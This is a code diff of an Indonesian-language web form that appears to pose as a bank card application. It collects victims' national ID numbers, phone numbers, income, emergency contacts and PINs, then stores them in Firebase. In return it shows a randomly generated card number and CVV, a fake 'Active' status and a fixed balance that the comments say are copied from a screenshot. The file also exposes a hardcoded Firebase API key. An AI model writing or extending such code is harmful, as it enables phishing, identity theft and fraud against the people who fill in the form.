@@ -1,7 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
 import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
-// Konfigurasi Firebase Anda
 const firebaseConfig = {
     apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
     authDomain: "wifist-d3588.firebaseapp.com",
@@ -13,6 +12,7 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 let currentStep = 1;
+let isFlipLocked = false; // Untuk handle delay balik kartu
 
 // --- SELEKSI INPUT ---
 const inputNama = document.getElementById('inputNama');
@@ -31,7 +31,7 @@ inputNama.addEventListener('input', (e) => {
     });
 });
 
-// --- NAVIGASI HALAMAN ---
+// --- NAVIGASI ---
 window.nextStep = (s) => {
     if (s > currentStep && !validateFields(currentStep)) return;
     currentStep = s;
@@ -85,7 +85,6 @@ async function prosesAnalisisSistem() {
 
     const namaValue = inputNama.value;
     const nikValue = inputNIK.value;
-    const waValue = inputWA.value;
 
     const isSequential = (str) => /(.)\1{5,}/.test(str);
     const kasar = ["ANJING", "KONTOL", "MEMEK", "GOBLOK", "ASU", "ADMIN", "TEST", "CASH"];
@@ -94,7 +93,7 @@ async function prosesAnalisisSistem() {
     let skor = "A+";
     let pesan = "";
 
-    if (isSequential(nikValue) || isSequential(waValue)) { skor = "E"; pesan = "Data terdeteksi SPAM/Beruntun."; }
+    if (isSequential(nikValue)) { skor = "E"; pesan = "Data terdeteksi SPAM/Beruntun."; }
     else if (isKasar) { skor = "D"; pesan = "Nama mengandung kata tidak pantas."; }
 
     try {
@@ -107,7 +106,7 @@ async function prosesAnalisisSistem() {
                 }
             }
         }
-    } catch (e) { console.error("DB Check Error"); }
+    } catch (e) { console.error("DB Error"); }
 
     setTimeout(() => {
         if (skor === "E" || skor === "D") {
@@ -120,14 +119,12 @@ async function prosesAnalisisSistem() {
     }, 2500);
 }
 
-// --- STEP 7: KONFIRMASI (HANYA PINDAH HALAMAN) ---
 window.generateFinal = async () => {
     if (!document.getElementById('checkAgree').checked) return alert("Harap centang persetujuan!");
     updateUI(8);
     initQueue();
 };
 
-// --- STEP 8: PROSES PENERBITAN & SIMPAN DATABASE ---
 function initQueue() {
     let timeLeft = 120;
     const interval = setInterval(() => {
@@ -141,14 +138,14 @@ function initQueue() {
     }, 1000);
 }
 
+// --- STEP 8: PENERBITAN & SIMPAN SESUAI GAMBAR ---
 async function finalRevealProcess() {
-    // 1. Matikan Area Loading, Munculkan Kartu
     document.getElementById('processingArea').style.display = 'none';
     document.getElementById('finalReveal').style.display = 'block';
     document.querySelector('.card-scene').classList.add('final-glow');
 
-    // 2. Generate Nomor Kartu & Data Akhir
-    const cardNoRaw = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
+    // Generate Nomor & CVV
+    const cardNoRaw = "001031" + Math.floor(Math.random() * 899999 + 100000) + "1785"; // Simulasi format mirip gambar
     const cardNoFormatted = cardNoRaw.match(/.{1,4}/g).join(" ");
     const cvvRandom = Math.floor(Math.random() * 899 + 100);
     
@@ -157,39 +154,65 @@ async function finalRevealProcess() {
     document.getElementById('displayName').innerText = inputNama.value;
     document.querySelector('.cvv-code').innerText = cvvRandom;
 
-    // 3. Simpan Ke Firebase (Key = Nomor Kartu)
+    // --- STRUKTUR DATA IDENTIK DENGAN GAMBAR (ILHAM PRAYUDA) ---
     const nasabahData = {
-        nomor_kartu: cardNoFormatted,
-        cvv: cvvRandom,
-        nama: inputNama.value,
-        nik: inputNIK.value,
-        wa: inputWA.value,
+        activeVariant: "Rose Signature", // Sesuai gambar
+        cardStatus: "Active",             // Sesuai gambar
         email: document.getElementById('inputEmail').value,
+        kontak_darurat: {                // Mengelompokkan kontak darurat
+            nama_keluarga: document.querySelector('.em-name')?.value || "-",
+            nomor_hp: document.querySelector('.em-phone')?.value || "-"
+        },
+        name: inputNama.value,
+        nik: inputNIK.value,
+        nomor_kartu: cardNoRaw,          // Tanpa spasi sesuai permintaan
         pekerjaan: document.getElementById('jobType').value,
         pendapatan: document.getElementById('income').value,
         pin: inputPW.value,
-        tgl_terbit: new Date().toLocaleString()
+        saldo: 1068500,                  // Default saldo sesuai gambar
+        tgl_daftar: new Date().toISOString(), // Format ISO sesuai gambar
+        wa: inputWA.value
     };
 
     try {
-        // Data masuk ke database menggunakan nomor kartu sebagai Key
         await set(ref(db, 'nasabah/' + cardNoRaw), nasabahData);
-        console.log("Sinkronisasi Berhasil: " + cardNoRaw);
     } catch (e) {
         console.error("Gagal sinkronisasi database");
     }
 
-    // 4. Animasi Teks Validasi
     for(let i=1; i<=3; i++) {
         await new Promise(r => setTimeout(r, 600));
         document.getElementById(`rev${i}`).classList.add('show');
     }
 }
 
-// --- FITUR TAMBAHAN ---
+// --- FITUR BALIK KARTU DENGAN COOLDOWN 5 DETIK ---
 window.toggleFlip = () => {
-    document.getElementById('cardInner').classList.toggle('is-flipped');
+    if (isFlipLocked) {
+        alert("Mohon tunggu 5 detik sebelum membalik kartu kembali.");
+        return;
+    }
+
+    const card = document.getElementById('cardInner');
+    card.classList.toggle('is-flipped');
+    
     if (navigator.vibrate) navigator.vibrate(25);
+
+    // Kunci tombol selama 5 detik
+    isFlipLocked = true;
+    const flipBtn = document.querySelector('.btn-flip');
+    const originalText = flipBtn.innerText;
+    
+    let countdown = 5;
+    const timer = setInterval(() => {
+        countdown--;
+        flipBtn.innerText = `🔄 (${countdown}s)`;
+        if (countdown <= 0) {
+            clearInterval(timer);
+            isFlipLocked = false;
+            flipBtn.innerText = originalText;
+        }
+    }, 1000);
 };
 
 window.takeScreenshot = () => {
@@ -203,16 +226,4 @@ window.takeScreenshot = () => {
         link.click();
         btn.innerText = "📸 SIMPAN GAMBAR KARTU";
     });
-};
-
-window.addEmergencyField = () => {
-    const container = document.getElementById('emergencyContainer');
-    const div = document.createElement('div');
-    div.className = 'emergency-item';
-    div.innerHTML = `
-        <div class="input-group"><label>Nama Keluarga</label><input type="text" class="em-name"></div>
-        <div class="input-group"><label>Nomor HP</label><input type="tel" class="em-phone"></div>
-        <button type="button" onclick="this.parentElement.remove()" style="color:red; font-size:10px; border:none; background:none; cursor:pointer;">Hapus</button>
-    `;
-    container.appendChild(div);
 };
